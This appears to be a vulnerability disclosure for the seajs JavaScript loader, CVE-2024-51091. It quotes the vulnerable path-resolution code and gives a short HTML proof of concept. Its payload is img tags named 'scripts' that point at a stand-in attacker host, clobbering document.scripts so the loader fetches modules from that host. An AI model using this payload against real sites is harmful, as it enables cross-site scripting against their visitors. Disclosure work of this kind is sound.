## seajs

### Meta

+ Library: seajs
+ Stars: 8.3K
+ Version: v3.0.3
+ Payload: ```<img name="scripts" src="https://attack.hulk"><img name="scripts" src="https://attack.hulk">```
+ Impact: XSS
+ CVE: [CVE-2024-51091](https://nvd.nist.gov/vuln/detail/CVE-2024-51091)
+ Status: Reported
+ Foundby: TheHulk


### Library

https://github.com/seajs/seajs


### Vulnerable Code Snippet

```javascript
// https://github.com/seajs/seajs/blob/master/src/util-path.js#L231-L247
var doc = document
var scripts = doc.scripts

// Recommend to add `seajsnode` id for the `sea.js` script element
var loaderScript = doc.getElementById("seajsnode") ||
	scripts[scripts.length - 1]

function getScriptAbsoluteSrc(node) {
	return node.hasAttribute ? // non-IE6/7
		node.src :
		// see http://msdn.microsoft.com/en-us/library/ms536429(VS.85).aspx
		node.getAttribute("src", 4)
}
loaderPath = getScriptAbsoluteSrc(loaderScript)
// When `sea.js` is inline, set loaderDir to current working directory
loaderDir = dirname(loaderPath || cwd)
```

### PoC
```html

<!--Library-->
<script src="./sea-modules/seajs/seajs/3.0.3/sea.js"></script>
<script>
// Set configuration
seajs.config({
  alias: {
    "jquery": "jquery/jquery/1.10.1/jquery.js"
  }
});
seajs.use("examples/hello/1.0.0/main");
</script>
<!--Library-->

<!--Payload-->
<img name="scripts" src="http://localhost:9999">
<img name="scripts" src="http://localhost:9999">
<!--Payload-->
```